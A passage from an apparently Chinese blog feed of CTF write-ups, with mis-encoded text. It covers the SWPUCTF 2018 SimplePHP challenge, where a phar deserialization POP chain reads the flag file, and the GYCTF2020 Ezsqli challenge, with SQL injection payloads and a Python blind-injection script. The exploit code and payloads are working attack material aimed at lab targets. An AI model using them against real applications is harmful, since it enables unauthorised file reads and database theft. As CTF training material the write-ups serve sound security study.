class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æœ‰ååºåˆ—åŒ–åˆ©ç”¨ç‚¹â€¦â€¦</p><h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3><p><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p><p>ç»“åˆæ–‡ä»¶ä¸Šä¼ ä¸­çš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨pharä¸­ä»¥ååºåˆ—åŒ–æ–¹å¼å‚¨å­˜çš„meta-dataè¿›è¡Œååºåˆ—åŒ–ã€‚åœ¨æ–‡ä»¶æ“ä½œå‡½æ•°è¿›è¡Œpharè§£ææ—¶ï¼Œmeta-dataçš„æ•°æ®ä¹Ÿä¼šä¸€åŒè§£æã€‚</p><p>å¼€å§‹æ‰¾popé“¾ï¼š</p><p>å…ˆæ‰¾é­”æ³•æ–¹æ³•â€¦â€¦__destruct()ã€__wakeup()ã€__toString()â€¦â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)//ææ„ï¼Œè„šæœ¬ç»“æŸè‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;<span class="comment">//toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;<span class="comment">//å±æ€§è°ƒç”¨-ã€‹get</span></span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ¥åˆ°file_get_contentsè¿›è¡Œæ–‡ä»¶è¯»å–</p><p>æ„å»ºè„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$c = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line">$c-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line">$b-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $c;</span><br><span class="line">$a-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//åˆ›å»º.pharæ–‡ä»¶</span></span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//å†™å…¥ç¼“å†²</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®š</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//ç”Ÿæˆç­¾å</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>éœ€è¦ä¿®æ”¹php.iniä¸­çš„phar.readonlyï¼Œä¸”ä¸€å®šè¦å»æ‰å‰é¢çš„åˆ†å·ï¼â€¦â€¦</p></blockquote><p>ä¸Šä¼ æ–‡ä»¶åï¼š$filename = md5($_FILES[â€œfileâ€][â€œnameâ€].$_SERVER[â€œREMOTE_ADDRâ€]).â€.jpgâ€;</p><p>move_uploaded_file($_FILES[â€œfileâ€][â€œtmp_nameâ€],â€upload/â€œ . $filename); è½¬ç§»åˆ°æŒ‡å®šçš„uploadç›®å½•</p><p>ç”Ÿæˆpharåæ”¹åç¼€ä¸ºjpgï¼Œä¸Šä¼ </p><img src="/images/SWPUCTF-2018-SimplePHP/image-20210504164131263.png" alt="image-20210504164131263" style="zoom:80%;" /><p>ç”¨pharåè®®å»è¯»å–ï¼š</p><p>phar://upload/febdf38ac03e62cb8f05d46cefefd732.jpg</p><p><img src="/images/SWPUCTF-2018-SimplePHP/image-20210504164935877.png" alt="image-20210504164935877"></p><blockquote><?php     //$a = 'flag{e89a6b68-6755-4537-85ec-b9f47eb51ab3}'; ?></blockquote><p>å¾—åˆ°flagâ€¦â€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SWPUCTF-2018-SimplePHP&quot;&gt;&lt;a href=&quot;#SWPUCTF-2018-SimplePHP&quot; class=&quot;headerlink&quot; title=&quot;[SWPUCTF 2018]SimplePHP&quot;&gt;&lt;/a&gt;[SWPUCTF 2018]Simpl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GYCTF2020-Ezsqli</title>
    <link href="http://example.com/2021/05/04/GYCTF2020-Ezsqli/"/>
    <id>http://example.com/2021/05/04/GYCTF2020-Ezsqli/</id>
    <published>2021-05-04T01:28:57.000Z</published>
    <updated>2021-05-04T03:28:13.028Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><p>idæ˜¯æ³¨å…¥ç‚¹ï¼Œ4/2å‘ç°æ˜¯æ•°å€¼å‹æ³¨å…¥â€¦â€¦æµ‹è¯•ä¸‹ï¼š</p><img src="/images/GYCTF2020-Ezsqli/image-20210504093103645.png" alt="image-20210504093103645" style="zoom:80%;" /><p>informationéƒ½è¢«è¿‡æ»¤äº†â€¦â€¦è¿™é‡Œå¿…é¡»è¦ç»•è¿‡è¿™ä¸ªè¿‡æ»¤</p><h3 id="information-schemaç»•è¿‡"><a href="#information-schemaç»•è¿‡" class="headerlink" title="information_schemaç»•è¿‡"></a>information_schemaç»•è¿‡</h3><p><a href="https://www.anquanke.com/post/id/193512">èŠä¸€èŠbypass information_schema</a></p><p><a href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysqlæ³¨å…¥ç»•è¿‡information_schemaè¿‡æ»¤</a></p><p><a href="https://www.jianshu.com/p/4a084ea1c7d4">information_schemaä»£æ›¿æ–¹æ³•</a></p><h4 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h4><p>SELECT * from sys.schema_table_statistics_with_buffer</p><table><thead><tr><th align="left">table_schema</th><th align="left">table_name</th><th align="right">rows_fetched</th><th align="left">fetch_latency</th><th align="right">rows_inserted</th><th align="left">insert_latency</th><th align="right">rows_updated</th><th align="left">update_latency</th><th align="right">rows_deleted</th><th align="left">delete_latency</th><th align="right">io_read_requests</th><th align="left">io_read</th><th align="left">io_read_latency</th><th align="right">io_write_requests</th><th align="left">io_write</th><th align="left">io_write_latency</th><th align="right">io_misc_requests</th><th align="left">io_misc_latency</th><th align="left">innodb_buffer_allocated</th><th align="left">innodb_buffer_data</th><th align="left">innodb_buffer_free</th><th align="right">innodb_buffer_pages</th><th align="right">innodb_buffer_pages_hashed</th><th align="right">innodb_buffer_pages_old</th><th align="right">innodb_buffer_rows_cached</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td><td align="right"></td><td align="left"></td><td align="right"></td><td align="left"></td><td align="right"></td><td align="left"></td><td align="right"></td><td align="left"></td><td align="right"></td><td align="left"></td><td align="left"></td><td align="right"></td><td align="left"></td><td align="left"></td><td align="right"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="right"></td><td align="right"></td><td align="right"></td><td align="right"></td></tr></tbody></table><p>å¯ä»¥çœ‹åˆ°æœ‰table_schemaå’Œtable_nameï¼Œå€Ÿæ­¤å¯ä»¥è·å¾—è¡¨åï¼š</p><img src="/images/GYCTF2020-Ezsqli/image-20210504101705740.png" alt="image-20210504101705740" style="zoom:80%;" /><p>ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰åˆ—åï¼Œè¿™é‡Œéœ€è¦</p><h3 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h3><p><a href="https://www.jianshu.com/p/4a084ea1c7d4">https://www.jianshu.com/p/4a084ea1c7d4</a></p><p><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p><p>è¿ç”¨åˆ°sqlæ¯”è¾ƒå­—ç¬¦ä¸²çš„ç‰¹æ€§ï¼Œå½“ä¸¤ä¸ªå­—ç¬¦ä¸²åšæ¯”è¾ƒè¿ç®—æ—¶ï¼Œä¼šå…ˆæ¯”è¾ƒé¦–ä½å­—ç¬¦ï¼Œè‹¥é¦–ä½ç›¸åŒï¼Œåˆ™æ¯”è¾ƒç¬¬äºŒä½â€¦â€¦</p><blockquote><p>id=2||((select 1,â€gâ€)&gt;(select * from f1ag_1s_h3r3_hhhhh))#</p><p>ä¸¤è¾¹æŸ¥è¯¢çš„åˆ—æ•°è¦ç›¸åŒ</p></blockquote><p>æ‹é¡ºé€»è¾‘ç”¨äºŒåˆ†æ³•å†™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://bec2be36-f01b-4b15-bc93-dc44e0b9fbb6.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line">data1 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># åº“å</span></span><br><span class="line">data2 = <span class="string">&quot;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;=&#123;&#125;#&quot;</span></span><br><span class="line"><span class="comment"># è¡¨å</span></span><br><span class="line">data3 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># åˆ—å</span></span><br><span class="line">data4 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># æ•°æ®</span></span><br><span class="line">data5 = <span class="string">&quot;2||((select 1,&#x27;&#123;&#125;&#x27;)&lt;=(select * from f1ag_1s_h3r3_hhhhh))#&quot;</span></span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²ç§»ä½æ¯”è¾ƒ+æ— åˆ—å</span></span><br><span class="line">data = data5</span><br><span class="line"><span class="comment"># é€‰æ‹©postæ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="built_in">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        <span class="keyword">if</span> data != data5:</span><br><span class="line">            pay = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: data.<span class="built_in">format</span>(x, y)</span><br><span class="line">                   &#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pay = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: data.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(<span class="built_in">int</span>(y)))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(pay)</span></span><br><span class="line">        <span class="comment"># è¿™é‡Œéœ€æ›´æ”¹æ³¨å…¥ç‚¹</span></span><br><span class="line">        response = requests.post(url=url, data=pay)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">    flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>æ­äº†ä¸ªpostæ¶ï¼Œä¹Ÿä¸çŸ¥é“å¥½ä¸å¥½ç”¨â€¦â€¦</p></blockquote><img src="/images/GYCTF2020-Ezsqli/image-20210504112734844.png" alt="image-20210504112734844" style="zoom:80%;" /><p>è½¬å°å†™å¾—åˆ°flagâ€¦â€¦</p><p>flag{333ed6af-c961-438b-91fd-c578e87536a6}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;GYCTF2020-Ezsqli&quot;&gt;&lt;a href=&quot;#GYCTF2020-Ezsqli&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]Ezsqli&quot;&gt;&lt;/a&gt;[GYCTF2020]Ezsqli&lt;/h3&gt;&lt;p&gt;idæ˜¯æ³¨å…¥ç‚¹ï¼Œ4/2å‘ç°</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>RCTF2015-EasySQL</title>
    <link href="http://example.com/2021/04/25/RCTF2015-EasySQL/"/>
    <id>http://example.com/2021/04/25/RCTF2015-EasySQL/</id>
    <published>2021-04-25T04:05:09.000Z</published>
    <updated>2021-04-25T04:40:38.395Z</updated>
    
